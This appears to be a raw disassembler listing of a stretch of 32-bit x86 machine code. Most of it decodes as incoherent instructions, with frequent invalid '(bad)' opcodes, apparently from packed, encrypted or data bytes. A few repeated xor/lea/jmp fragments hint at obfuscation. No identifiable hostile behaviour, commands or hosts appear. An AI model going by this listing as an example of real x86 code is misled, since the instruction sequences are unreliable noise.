  415a51:	cmp    eax,0xd9551aab
  415a56:	imul   eax,eax,0x66
  415a59:	fstp   TBYTE PTR [ebx-0x17be573f]
  415a5f:	dec    esp
  415a60:	push   0x5e
  415a62:	(bad)
  415a66:	jno    0x415ac7
  415a68:	xchg   edi,eax
  415a69:	sahf   
  415a6a:	inc    ebx
  415a6b:	aad    0x90
  415a6d:	std    
  415a6e:	(bad)  
  415a6f:	xlat   BYTE PTR ds:[ebx]
  415a70:	ret    
  415a71:	mov    ds:0x90d402e3,al
  415a76:	popa   
  415a77:	cmp    al,0x1e
  415a79:	add    eax,0xed10c8a0
  415a7e:	loopne 0x415ae1
  415a80:	xchg   ebp,eax
  415a81:	mov    WORD PTR [edx],?
  415a83:	sbb    BYTE PTR [ecx-0x1a277427],al
  415a89:	push   cs
  415a8a:	xor    edx,ecx
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	mov    ecx,0xb8861f41
  415aa9:	or     eax,0x7eb9707f
  415aae:	jo     0x415b20
  415ab0:	pop    ebp
  415ab1:	lea    edx,[edi-0x62af9928]
  415ab7:	imul   edx,DWORD PTR [esi-0x74],0xb59180f9
  415abe:	inc    ebp
  415abf:	gs sti 
  415ac1:	test   DWORD PTR ds:0x1bc5b5a7,esi
  415ac7:	jns    0x415a6a
  415ac9:	mov    edx,0x432ae8dd
  415ace:	stos   BYTE PTR es:[edi],al
  415acf:	ja     0x415a70
  415ad1:	mov    ecx,0x36de334a
  415ad6:	push   0xffffff87
  415ad8:	imul   edi,DWORD PTR [edx],0x71
  415adb:	aas    
  415adc:	test   BYTE PTR [edx+0x43afe435],0xe5
  415ae3:	adc    al,0xd7
  415ae5:	fimul  DWORD PTR [edx-0x41]
  415ae8:	push   eax
  415ae9:	scas   al,BYTE PTR es:[edi]
  415aea:	mov    ebx,0x42e20947
  415aef:	and    ebp,esp
  415af1:	add    BYTE PTR [ebp+0x53],0x5b
  415af5:	sahf   
  415af6:	std    
  415af7:	xchg   esi,eax
  415af8:	mov    eax,0xac7ca4d0
  415afd:	ja     0x415ab7
  415aff:	retf   0xb350
  415b02:	(bad)  
  415b03:	aad    0x35
  415b05:	push   edx
  415b06:	jo     0x415b0b
  415b08:	sub    al,0x6e
  415b0a:	sub    al,dh
  415b0c:	and    al,0xf5
  415b0e:	or     DWORD PTR [edx+0x19],edx
  415b11:	mul    DWORD PTR [ecx+eax*1+0x3f87ea80]
  415b18:	repnz mov eax,ds:0xe8439fef
  415b1e:	test   DWORD PTR [eax+eiz*8],edi
  415b21:	into   
  415b22:	(bad)
  415b27:	or     BYTE PTR [ebp-0x22],dh
  415b2a:	fst    DWORD PTR [ecx-0x55]
  415b2d:	add    al,0xb9
  415b2f:	jmp    0x74e5b3d2
  415b34:	leave  
  415b35:	adc    ah,bl
  415b37:	sbb    eax,0x6e82cf7a
  415b3c:	push   eax
  415b3d:	stos   BYTE PTR es:[edi],al
  415b3e:	mov    eax,ds:0x3576d33d
  415b43:	loope  0x415b54
  415b45:	fimul  WORD PTR [edi]
  415b47:	xlat   BYTE PTR ds:[ebx]
  415b48:	(bad)  
  415b49:	outs   dx,BYTE PTR ds:[esi]
  415b4a:	mov    dh,0x82
  415b4c:	addr16 pop esi
  415b4e:	sar    BYTE PTR [edx],1
  415b50:	loopne 0x415b3f
  415b52:	fmul   QWORD PTR gs:[eax-0x4f37dd53]
  415b59:	xchg   esi,eax
  415b5a:	in     al,dx
  415b5b:	and    al,BYTE PTR [esi]
  415b5d:	addr16 cli 
  415b5f:	ret    0x7944
  415b62:	aad    0xf1
  415b64:	pusha  
  415b65:	sti    
  415b66:	sbb    edi,DWORD PTR [eax-0x94ef275]
  415b6c:	cdq    
  415b6d:	jb     0x415bc6
  415b6f:	rcl    BYTE PTR [ebx-0x45],1
  415b72:	cmp    eax,0x57d1d45d
  415b77:	test   ebp,ebp
  415b79:	cdq    
  415b7a:	repz dec ebx
  415b7c:	sub    dh,BYTE PTR cs:[esi-0x79ada08]
  415b83:	(bad)  
  415b84:	xchg   edi,eax
  415b85:	jge    0x415be8
  415b87:	jmp    0xdc9de569
  415b8c:	mov    WORD PTR [esi],es
  415b8e:	retf   0xe561
  415b91:	jecxz  0x415c0a
  415b93:	fld    QWORD PTR [ebp+0x2]
  415b96:	mov    BYTE PTR [eax-0x6e],ch
  415b99:	clc    
  415b9a:	retf   0x51e7
  415b9d:	cmc    
  415b9e:	mov    cl,0xfb
  415ba0:	sub    dl,BYTE PTR [ebx+0xb]
  415ba3:	popf   
  415ba4:	scas   al,BYTE PTR es:[edi]
  415ba5:	push   esp
  415ba6:	xor    esp,DWORD PTR [ecx]
  415ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ba9:	cmp    eax,0xb5e98fef
  415bae:	push   es
  415baf:	in     eax,0xab
  415bb1:	xchg   edx,eax
  415bb2:	adc    eax,DWORD PTR [esi-0x58]
  415bb5:	(bad)
  415bb8:	sbb    ebx,DWORD PTR [ebx+0x70]
  415bbb:	shl    BYTE PTR [edi],cl
  415bbd:	lods   eax,DWORD PTR ds:[esi]
  415bbe:	scas   al,BYTE PTR es:[edi]
  415bbf:	cmc    
  415bc0:	lea    ebx,[edx-0x68]
  415bc3:	xor    al,0xd7
  415bc5:	pop    ss
  415bc6:	into   
  415bc7:	sub    eax,0xc0bc9516
  415bcc:	out    dx,eax
  415bcd:	mov    edi,0xe9445aaa
  415bd2:	and    al,0x8
  415bd4:	out    0x4a,eax
  415bd6:	or     edi,DWORD PTR [edi+0x14]
  415bd9:	mov    DWORD PTR [eax+esi*4+0x375c996a],ecx
  415be0:	out    dx,eax
  415be1:	sbb    al,0x35
  415be3:	je     0x415ba5
  415be5:	dec    eax
  415be6:	xor    DWORD PTR ds:0x70de49da,eax
  415bec:	mov    bl,0x18
  415bee:	fucomp st(2)
  415bf0:	dec    edx
  415bf1:	push   0xf9d386b1
  415bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bf7:	sahf   
  415bf8:	push   0x49dbe4df
  415bfd:	cmp    esi,ebx
  415bff:	ficom  DWORD PTR [ecx-0x7646a5b]
  415c05:	push   0xffffffd1
  415c07:	push   esp
  415c08:	imul   ebx,DWORD PTR ds:0xde6f6945,0xb5b0caf
  415c12:	es mov edx,0x454f51d5
  415c18:	inc    ebp
  415c19:	data16 and al,0x64
  415c1c:	mov    ebx,0x85893aca
  415c21:	arpl   WORD PTR [edi+0x3e66a3a9],ax
  415c27:	jg     0x415c7a
  415c29:	inc    ebx
  415c2a:	push   esi
  415c2b:	jge    0x415c76
  415c2d:	push   edx
  415c2e:	inc    ebp
  415c2f:	xor    eax,0x7d165ba8
  415c34:	outs   dx,BYTE PTR ds:[esi]
  415c35:	mov    bh,0x34
  415c37:	les    edi,FWORD PTR [ecx+0x2b544948]
  415c3d:	or     ebx,esi
  415c3f:	mov    bh,0x85
  415c41:	pop    ebx
  415c42:	ret    0xad07
  415c45:	or     al,0xde
  415c47:	call   0xb70b02a9
  415c4c:	add    DWORD PTR [edx+0xae75faa],ecx
  415c52:	sbb    BYTE PTR [esi],0x1e
  415c55:	pop    edi
  415c56:	and    edx,DWORD PTR [eax-0x74c5de43]
  415c5c:	ins    DWORD PTR es:[edi],dx
  415c5d:	retf   0x2beb
  415c60:	fimul  WORD PTR [edx-0x18c32af0]
  415c66:	nop
  415c67:	hlt    
  415c68:	mov    eax,ds:0x57d1f457
  415c6d:	fxch   st(4)
  415c6f:	pop    es
  415c70:	fnstenv [esi-0x66]
  415c73:	stos   BYTE PTR es:[edi],al
  415c74:	pop    ebx
  415c75:	mov    cs,WORD PTR [eax-0x80]
  415c78:	jge    0x415cf9
  415c7a:	add    edx,esi
  415c7c:	jmp    0x415cad
  415c7e:	pop    ebp
  415c7f:	mov    ds:0xdef26535,eax
  415c84:	sar    DWORD PTR [ecx+0x11],1
  415c87:	aad    0x2d
  415c89:	call   0x506aea9d
  415c8e:	adc    BYTE PTR [esi],dl
  415c90:	jnp    0x415caa
  415c92:	mov    cl,0xfb
  415c94:	mov    cl,0x52
  415c96:	test   BYTE PTR [esi],0x9d
  415c99:	imul   esi,esi,0xffffffa6
  415c9c:	mov    ebp,DWORD PTR [edx+0x652cbfe]
  415ca2:	push   edi
  415ca3:	repz sbb eax,0xc5a3167a
  415ca9:	push   eax
  415caa:	fnstenv [edi]
  415cac:	rol    ch,1
  415cae:	leave  
  415caf:	xchg   edi,eax
  415cb0:	data16 adc BYTE PTR [edx+0xf],dl
  415cb4:	enter  0xa20d,0x29
  415cb8:	mov    esi,db1
  415cbb:	cwde   
  415cbc:	bound  ebp,QWORD PTR [ebx+ecx*4]
  415cbf:	jge    0x415d39
  415cc1:	enter  0xefb7,0xde
  415cc5:	std    
  415cc6:	mov    ah,0x8a
  415cc8:	int3   
  415cc9:	pop    eax
  415cca:	(bad)  
  415ccb:	jmp    0x415c57
  415ccd:	mov    ah,0x33
  415ccf:	stos   BYTE PTR es:[edi],al
  415cd0:	xchg   ebp,eax
  415cd1:	int3   
  415cd2:	rcl    ch,0xdd
  415cd5:	(bad)  
  415cd6:	adc    BYTE PTR [ecx],cl
  415cd8:	pop    esi
  415cd9:	cmp    ebp,DWORD PTR [eax+0x69f4fda0]
  415cdf:	outs   dx,DWORD PTR ds:[esi]
  415ce0:	test   BYTE PTR [eax+edx*1],dl
  415ce3:	inc    ecx
  415ce4:	imul   edi,DWORD PTR [ecx+0x7c518270],0xeaf7bcce
  415cee:	ds jmp 0x24ba:0x2fc329be
  415cf6:	in     eax,dx
  415cf7:	mov    ebp,ebp
  415cf9:	je     0x415d16
  415cfb:	push   ebx
  415cfc:	sbb    DWORD PTR [eax+0x1b],edi
  415cff:	in     al,dx
  415d00:	mov    DWORD PTR [edx-0x48],edi
  415d03:	and    al,0x40
  415d05:	and    edx,DWORD PTR [eax+0x23]
  415d08:	add    edi,edx
  415d0a:	fild   DWORD PTR [ebx]
  415d0c:	js     0x415cdb
  415d0e:	add    ecx,DWORD PTR [ebp+0x25f703bf]
  415d14:	sbb    WORD PTR [ebx+0x1],bx
  415d18:	xchg   esi,eax
  415d19:	sub    BYTE PTR [ebx+0x5e695029],bh
  415d1f:	cld    
  415d20:	push   ds
  415d21:	jecxz  0x415d89
  415d23:	xchg   esi,eax
  415d24:	mov    edi,0xefb6ec82
  415d29:	pop    esp
  415d2a:	bound  eax,QWORD PTR [ebx-0x5be82e1]
  415d30:	pop    edi
  415d31:	pop    eax
  415d32:	rcl    BYTE PTR [edx+0x78611a94],cl
  415d38:	adc    eax,0xad5118e7
  415d3d:	call   DWORD PTR [ebp+0x647ff928]
  415d43:	leave  
  415d44:	not    BYTE PTR [esi]
  415d46:	inc    ebx
  415d47:	gs inc esp
  415d49:	and    ah,BYTE PTR [esi+eax*8+0x74]
  415d4d:	stos   DWORD PTR es:[edi],eax
  415d4e:	fs retf 
  415d50:	add    BYTE PTR [esi+0x18],bh
  415d53:	je     0x415dbe
  415d55:	sub    eax,0xa39e4299
  415d5a:	leave  
  415d5b:	(bad)  
  415d5c:	sar    BYTE PTR [edx],0xad
  415d5f:	leave  
  415d60:	mov    edx,0x1400c10d
  415d65:	in     al,0x4b
  415d67:	in     eax,dx
  415d68:	mov    al,ds:0xdc2e3dc2
  415d6d:	sahf   
  415d6e:	xchg   esi,eax
  415d6f:	xor    al,0xb9
  415d71:	cld    
  415d72:	stos   DWORD PTR es:[edi],eax
  415d73:	test   eax,0x8b158987
  415d78:	push   ebp
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
  415d94:	lea    edi,[edx]
  415d96:	xchg   DWORD PTR [edx+0x707f0a81],edi
  415d9c:	mov    ecx,0x8e70707e
  415da1:	stos   DWORD PTR es:[edi],eax
  415da2:	xchg   esi,eax
  415da3:	and    al,0x7d
  415da5:	sar    DWORD PTR [edi],cl
  415da7:	and    al,0xd
  415da9:	jb     0x415e25
  415dab:	inc    ebp
  415dac:	xchg   ebp,eax
  415dad:	xor    cl,BYTE PTR [edx+0x4323cf2a]
  415db3:	mov    ?,WORD PTR [ebx-0x5701029b]
  415db9:	rcl    ecx,1
  415dbb:	add    eax,0xf68fec40
  415dc0:	push   esi
  415dc1:	dec    esi
  415dc2:	scas   al,BYTE PTR es:[edi]
  415dc3:	dec    esi
  415dc4:	leave  
  415dc5:	ret    
  415dc6:	ja     0x415dc4
  415dc8:	or     ecx,DWORD PTR [edx]
  415dca:	push   0x50f4f77e
  415dcf:	adc    BYTE PTR [ecx+0x6ffd3240],ah
  415dd5:	nop
  415dd6:	dec    eax
  415dd7:	ins    DWORD PTR es:[edi],dx
  415dd8:	(bad)  
  415dd9:	cmp    eax,0x75d3eaa
  415dde:	adc    al,0x7c
  415de0:	or     DWORD PTR es:[edi-0x42],edi
  415de4:	jecxz  0x415deb
  415de6:	mov    ch,0xb0
  415de8:	mov    ebx,0xc354d295
  415ded:	retf   
  415dee:	jmp    0x801d:0x8b4f26e2
  415df5:	add    al,0xb0
  415df7:	sbb    eax,0xedc117fd
  415dfc:	mov    cl,0x9a
  415dfe:	or     BYTE PTR [ecx],al
  415e00:	xchg   esi,eax
  415e01:	mov    bl,0xab
  415e03:	out    0xd7,al
  415e05:	mov    eax,ds:0xd8ce77fc
  415e0a:	push   ds
  415e0b:	xchg   BYTE PTR [edi-0x3a],dl
  415e0e:	repnz pop edi
  415e10:	out    dx,al
  415e11:	lods   eax,DWORD PTR ds:[esi]
  415e12:	cmp    eax,0xba14907c
  415e17:	or     eax,0x4aa9b01b
  415e1c:	xchg   esi,eax
  415e1d:	jns    0x415de7
  415e1f:	xor    ch,BYTE PTR [edi]
  415e21:	dec    edx
  415e22:	cld    
  415e23:	mov    ds:0x83d2107b,eax
  415e28:	jg     0x415e8f
  415e2a:	data16 lahf 
  415e2c:	retf   
  415e2d:	or     al,ah
  415e2f:	jae    0x415e5c
  415e31:	sar    BYTE PTR [ecx-0x1d],cl
  415e34:	xchg   ebx,eax
  415e35:	or     sp,bp
  415e38:	jmp    0x319d:0xea1ff48c
  415e3f:	add    edx,DWORD PTR [edx-0x1c]
  415e42:	lahf   
  415e43:	push   es
  415e44:	fdivr  QWORD PTR [ecx-0x22]
  415e47:	sbb    eax,0xe9ea0c81
  415e4c:	in     eax,0x0
  415e4e:	pop    esi
  415e4f:	shl    DWORD PTR [ebp+0x248e46b3],0xe3
  415e56:	jl     0x415e49
  415e58:	jnp    0x415e69
  415e5a:	jo     0x415def
  415e5c:	xor    ch,BYTE PTR [ebp+0x21]
  415e5f:	frstor ds:0x54e87bef
  415e65:	mov    ?,WORD PTR [edx+0x6946956]
  415e6b:	jo     0x415e7a
  415e6d:	jbe    0x415e96
  415e6f:	inc    esp
  415e70:	stos   DWORD PTR es:[edi],eax
  415e71:	inc    esp
  415e72:	push   edx
  415e73:	pusha  
  415e74:	test   BYTE PTR [edx-0x5586c576],bh
  415e7a:	(bad)  
  415e7b:	mov    dh,0xad
  415e7d:	pop    ebp
  415e7e:	mov    ds:0x62facb9b,eax
  415e83:	mov    ah,0x3e
  415e85:	jbe    0x415e43
  415e87:	sbb    al,0x12
  415e89:	or     eax,0x6e67fcff
  415e8e:	int    0xd4
  415e90:	jg     0x415e27
  415e92:	mov    al,ds:0x104df7c6
  415e97:	pop    es
  415e98:	das    
  415e99:	mov    bh,0x62
  415e9b:	gs cli 
  415e9d:	out    0x75,eax
  415e9f:	lods   al,BYTE PTR ds:[esi]
  415ea0:	push   eax
  415ea1:	sub    al,0xca
  415ea3:	push   ebp
  415ea4:	jp     0x415ea0
  415ea6:	pop    edi
  415ea7:	in     eax,0x18
  415ea9:	adc    al,0xcf
  415eab:	lahf   
  415eac:	call   0x25b89195
  415eb1:	scas   eax,DWORD PTR es:[edi]
  415eb2:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  415eb4:	in     eax,dx
  415eb5:	ror    BYTE PTR [edx+0x33228fd4],1
  415ebb:	scas   eax,DWORD PTR es:[edi]
  415ebc:	dec    eax
  415ebd:	push   edx
  415ebe:	dec    eax
  415ebf:	lds    ecx,FWORD PTR [ebx-0x77d40014]
  415ec5:	or     ebp,DWORD PTR [esi-0x8]
  415ec8:	add    BYTE PTR [ebp+ebp*2-0x1],bl
  415ecc:	nop
  415ecd:	push   cs
  415ece:	inc    eax
  415ecf:	sub    eax,0x530237e3
  415ed4:	gs inc ebx
  415ed6:	adc    eax,0xf4365ece
  415edb:	pusha  
  415edc:	jns    0x415eba
  415ede:	adc    BYTE PTR [edi+0x63ecc625],ch
  415ee4:	mov    al,ds:0xcb20cd2d
  415ee9:	push   ebp
  415eea:	jmp    0xb617e8ea
  415eef:	cwde   
  415ef0:	and    eax,0x3b595ae5
  415ef5:	or     DWORD PTR [ebx],edx
  415ef7:	cli    
  415ef8:	xchg   esi,eax
  415ef9:	xchg   bl,cl
  415efb:	sbb    DWORD PTR [ecx-0x4fa441c9],edx
  415f01:	sub    ch,dl
  415f03:	jnp    0x415f14
  415f05:	stos   BYTE PTR es:[edi],al
  415f06:	push   0x68
  415f08:	sbb    ah,bl
  415f0a:	imul   esp,DWORD PTR [esi-0x6ba3c0ad],0xffffffb6
  415f11:	fidiv  DWORD PTR [eax+0x6f]
  415f14:	(bad)  
  415f16:	mov    edx,0x5a495cf6
  415f1b:	add    DWORD PTR [ebx+0x6a],ebp
  415f1e:	inc    edi
  415f1f:	fst    QWORD PTR [edi+0x7182d7e7]
  415f25:	ret    
  415f26:	imul   edx,DWORD PTR [edx-0x6f46e0f8],0x30a84814
  415f30:	das    
  415f31:	dec    edi
  415f32:	mov    bh,0x91
  415f34:	xchg   edi,eax
  415f35:	rol    BYTE PTR [esi],cl
  415f37:	cmp    DWORD PTR [edi],edi
  415f39:	push   ecx
  415f3a:	out    dx,al
  415f3b:	sbb    ebp,edi
  415f3d:	retf   
  415f3e:	mov    BYTE PTR [esi-0x59],al
  415f41:	jl     0x415fa9
  415f43:	adc    ebx,ecx
  415f45:	push   edx
  415f46:	xchg   edx,eax
  415f47:	sub    ch,BYTE PTR [eax+0x50]
  415f4a:	nop
  415f4b:	inc    BYTE PTR ds:0xe45fb281
  415f51:	sbb    ah,BYTE PTR [eax]
  415f53:	stos   BYTE PTR es:[edi],al
  415f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f55:	push   0x458069cc
  415f5a:	mov    eax,ds:0xced1bd84
  415f5f:	inc    ecx
  415f60:	das    
  415f61:	fistp  WORD PTR [ecx]
  415f63:	inc    eax
  415f64:	out    dx,eax
  415f65:	jl     0x415f25
  415f67:	aam    0x82
  415f69:	jb     0x415efb
  415f6b:	dec    edi
  415f6c:	jno    0x415fa1
  415f6e:	repz out 0x6f,eax
  415f71:	push   esp
  415f72:	test   eax,0x355fdf48
  415f77:	lea    ebp,[ecx+0x43314ff7]
  415f7d:	loop   0x415f5a
  415f7f:	jp     0x415f32
  415f81:	push   ebp
  415f82:	pop    ebx
  415f83:	xchg   esp,eax
  415f84:	sub    bh,cl
  415f86:	add    ebx,DWORD PTR [ebp-0x5c9c7798]
  415f8c:	add    BYTE PTR [edi+0x3f6142d2],bl
  415f92:	je     0x415f4f
  415f94:	mul    DWORD PTR [eax+0x5f139121]
  415f9a:	add    ebp,esp
  415f9c:	fwait
  415f9d:	aaa    
  415f9e:	iret   
  415f9f:	lds    eax,FWORD PTR [edi+eax*8]
  415fa2:	cli    
  415fa3:	out    dx,al
  415fa4:	xchg   edx,eax
  415fa5:	dec    edx
  415fa6:	push   edx
  415fa7:	sub    esi,DWORD PTR [esi+0x4b2e750f]
  415fad:	in     al,dx
  415fae:	xor    BYTE PTR [ebx+eiz*4],dh
  415fb1:	(bad)  
  415fb2:	sti    
  415fb3:	fmul   QWORD PTR [esi]
  415fb5:	(bad)  
  415fb7:	xchg   ebx,eax
  415fb8:	fst    QWORD PTR [edx-0x3955b46e]
  415fbe:	js     0x415f87
  415fc0:	add    dl,0x14
  415fc3:	xchg   ah,dh
  415fc5:	jp     0x415f76
  415fc7:	shl    DWORD PTR [edx+ebx*4+0x47b115e6],cl
  415fce:	rcr    DWORD PTR [ebx+0x7],0x7c
  415fd2:	pop    ss
  415fd3:	jge    0x415fee
  415fd5:	sahf   
  415fd6:	hlt    
  415fd7:	jmp    0x415fa4
  415fd9:	test   BYTE PTR [edx-0x2b],bh
  415fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fdd:	xor    BYTE PTR [esi],al
  415fdf:	mov    esp,cs
  415fe1:	adc    DWORD PTR [edx],edi
  415fe3:	xor    DWORD PTR [esi+0x54],eax
  415fe6:	stos   DWORD PTR es:[edi],eax
  415fe7:	add    al,0xcf
  415fe9:	pop    eax
  415fea:	pop    ss
  415feb:	div    eax
  415fed:	ins    BYTE PTR es:[edi],dx
  415fee:	jp     0x415fa7
  415ff0:	mov    edi,0xa03b7c4e
  415ff5:	cli    
  415ff6:	jmp    0x415fb2
  415ff8:	sub    esi,edx
  415ffa:	aas    
  415ffb:	out    dx,al
  415ffc:	test   BYTE PTR [edi+0x3f],0x8a
  416000:	inc    edx
  416001:	call   0x141d57c9
  416006:	cld    
  416007:	ss or  dh,al
  41600a:	in     eax,0xf3
  41600c:	mov    edi,0xe373053c
  416011:	test   BYTE PTR [edi-0x6fcacf25],bl
  416017:	inc    esp
  416018:	mov    eax,0x8a81cc1e
  41601d:	cmp    BYTE PTR [eax],ch
  41601f:	cmp    dh,BYTE PTR [edx+0x39dbda57]
  416025:	adc    DWORD PTR [edx+0xab211b],0x2314780e
  41602f:	jns    0x415fb7
  416031:	dec    eax
  416032:	and    eax,0xb68e0e72
  416037:	adc    al,0x95
  416039:	mov    dh,0x8c
  41603b:	ds int3 
  41603d:	xor    cl,ch
  41603f:	ficomp DWORD PTR [esi]
  416041:	mov    ds:0x1450f18a,eax
  416046:	xchg   edi,eax
  416047:	pusha  
  416048:	in     al,0xf2
  41604a:	pop    ds
  41604b:	and    esi,DWORD PTR [esi+ebx*4+0xc]
  41604f:	test   DWORD PTR [bp+di],0xd708396e
  416056:	push   ss
  416057:	pop    esi
  416058:	add    al,0x2a
  41605a:	popf   
  41605b:	mov    ds:0x78725ee0,eax
  416060:	icebp  
  416061:	(bad)  
  416062:	push   esi
  416063:	dec    esp
  416064:	cmc    
  416065:	and    eax,0x8558bef
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x4160ab
  41609a:	xlat   BYTE PTR ds:[ebx]
  41609b:	jmp    0xb970:0x7f17cab2
  4160a2:	jle    0x416114
  4160a4:	jo     0x4160d9
  4160a6:	or     esi,DWORD PTR [esi+ebx*4-0x1e]
  4160aa:	jp     0x416107
  4160ac:	sub    al,0xae
  4160ae:	popf   
  4160af:	les    ebx,FWORD PTR [eax-0x2988538c]
  4160b5:	adc    DWORD PTR [ecx-0xa],edi
  4160b8:	pop    edx
  4160b9:	nop
  4160ba:	or     DWORD PTR [edi-0x47003c54],esi
  4160c0:	dec    ecx
  4160c1:	bound  ebx,QWORD PTR [edx]
  4160c3:	ins    DWORD PTR es:[edi],dx
  4160c4:	xchg   esi,eax
  4160c5:	add    DWORD PTR [edi],edi
  4160c7:	xor    al,0x91
  4160c9:	inc    edi
  4160ca:	fstp   QWORD PTR [edx-0x70e7708d]
  4160d0:	scas   eax,DWORD PTR es:[edi]
  4160d1:	repnz and BYTE PTR [ecx],bl
  4160d4:	mov    bl,0x95
  4160d6:	scas   eax,DWORD PTR es:[edi]
  4160d7:	pop    ebp
  4160d8:	sbb    eax,0xaf8b07fc
  4160dd:	test   DWORD PTR [ebx-0x7d],ecx
  4160e0:	sub    esp,DWORD PTR [eax+0x0]
  4160e3:	push   eax
  4160e4:	das    
  4160e5:	mov    dh,dl
  4160e7:	das    
  4160e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160e9:	adc    DWORD PTR [ecx-0x23b59f35],eax
  4160ef:	xchg   esi,eax
  4160f0:	push   edx
  4160f1:	scas   eax,DWORD PTR es:[edi]
  4160f2:	test   eax,0x75c09bf5
  4160f7:	jecxz  0x4160c7
  4160f9:	(bad)  
  4160fa:	push   esp
  4160fb:	mov    edx,0x70b171c9
  416100:	cmp    al,BYTE PTR [ebp+0x14]
  416103:	push   ebx
  416104:	sub    esp,DWORD PTR [ecx]
  416106:	sbb    ebx,DWORD PTR [ebx+0x5b]
  416109:	push   edx
  41610a:	out    dx,eax
  41610b:	dec    ecx
  41610c:	mov    ecx,eax
  41610e:	mov    eax,0x95836abf
  416113:	imul   ebp,DWORD PTR [edi-0x7fbdbdb0],0xffffff92
  41611a:	popa   
  41611b:	pop    es
  41611c:	sti    
  41611d:	push   0x73
  41611f:	test   al,0x22
  416121:	dec    ecx
  416122:	mov    ebp,0xd0606ff1
  416127:	iret   
  416128:	xchg   edi,eax
  416129:	jge    0x416125
  41612b:	pop    ss
  41612c:	mov    dh,0x0
  41612e:	xchg   ecx,eax
  41612f:	idiv   DWORD PTR [ecx]
  416131:	imul   edi,DWORD PTR [eax+0x37],0x21
  416135:	ret    0xa4d1
  416138:	add    BYTE PTR gs:[eax-0x54],0xf8
  41613d:	pop    edx
  41613e:	inc    edi
  41613f:	daa    
  416140:	retf   0x2c8b
  416143:	in     eax,0xf
  416145:	pop    eax
  416146:	out    0xce,al
  416148:	jmp    0xdfc4:0x485cdeb3
  41614f:	mov    ah,0x3f
  416151:	mov    ebp,0xde128deb
  416156:	ret    0xd5fe
  416159:	out    dx,eax
  41615a:	sbb    al,0xf3
  41615c:	pop    eax
  41615d:	(bad)  
  41615e:	or     eax,0x61a3ab7e
  416163:	test   DWORD PTR [ecx],edi
  416165:	ins    BYTE PTR es:[edi],dx
  416166:	mov    gs,WORD PTR [edx]
  416168:	pop    DWORD PTR [edi-0x577afba0]
  41616e:	scas   eax,DWORD PTR es:[edi]
  41616f:	data16 xlat BYTE PTR ds:[ebx]
  416171:	retf   
  416172:	gs mov esi,0x576b8edb
  416178:	repz sub esp,DWORD PTR [ebp+0x18]
  41617c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41617d:	jns    0x4161e6
  41617f:	fwait
  416180:	cmp    al,0xb8
  416182:	fs xor al,0x3f
  416185:	xor    al,0x7
  416187:	or     esp,ebx
  416189:	test   edi,esi
  41618b:	inc    ebx
  41618c:	dec    esp
  41618d:	rol    DWORD PTR [esi],cl
  41618f:	sub    BYTE PTR [ebx-0x6e],cl
  416192:	leave  
  416193:	dec    esi
  416194:	or     DWORD PTR [edx+0x2feace68],esi
  41619a:	xor    BYTE PTR ds:0x6944f4b8,0x71
  4161a1:	inc    eax
  4161a2:	xchg   ebx,eax
  4161a3:	pop    edi
  4161a4:	or     dl,BYTE PTR [ecx]
  4161a6:	inc    eax
  4161a7:	cmp    eax,0x35f06a53
  4161ac:	dec    edi
  4161ad:	jmp    0xea0b59f3
  4161b2:	iret   
  4161b3:	mov    esp,0xac48b9be
  4161b8:	jmp    0xf594832f
  4161bd:	jns    0x4161c2
  4161bf:	mov    ds:0xacfa5516,al
  4161c4:	dec    eax
  4161c5:	xchg   dh,bl
  4161c7:	rcl    edx,cl
  4161c9:	sub    eax,0x1e071375
  4161ce:	adc    DWORD PTR [edx],edi
  4161d0:	scas   al,BYTE PTR es:[edi]
  4161d1:	shr    edx,1
  4161d3:	ret    0xbb6f
  4161d6:	popf   
  4161d7:	or     DWORD PTR [eax+0x74b9919b],0xbf335400
  4161e1:	sbb    eax,esi
  4161e3:	in     eax,dx
  4161e4:	imul   ebp,DWORD PTR [esi],0x5d
  4161e7:	out    dx,eax
  4161e8:	js     0x4161de
  4161ea:	aas    
  4161eb:	pop    es
  4161ec:	dec    ecx
  4161ed:	inc    edi
  4161ee:	inc    ecx
  4161ef:	xlat   BYTE PTR ds:[ebx]
  4161f0:	addr16 sub al,0xbc
  4161f3:	cdq    
  4161f4:	jg     0x41618e
  4161f6:	push   es
  4161f7:	mov    eax,0xb4f95ed4
  4161fc:	xor    ebx,DWORD PTR [esi+esi*2]
  4161ff:	cs fst st(4)
  416202:	sti    
  416203:	test   al,0x1c
  416205:	mov    ch,0xa9
  416207:	add    eax,0x2402642f
  41620c:	jns    0x4161fa
  41620e:	fisubr DWORD PTR [ebx-0x6d955dc1]
  416214:	bound  ecx,QWORD PTR [edx+0x1db14ca6]
  41621a:	es or  eax,0x70b24edc
  416220:	enter  0x6100,0xb
  416224:	shl    BYTE PTR [edi-0x24d1b31],cl
  41622a:	jae    0x4161b2
  41622c:	ss adc edi,ebx
  41622f:	mov    ebp,0xb9587f97
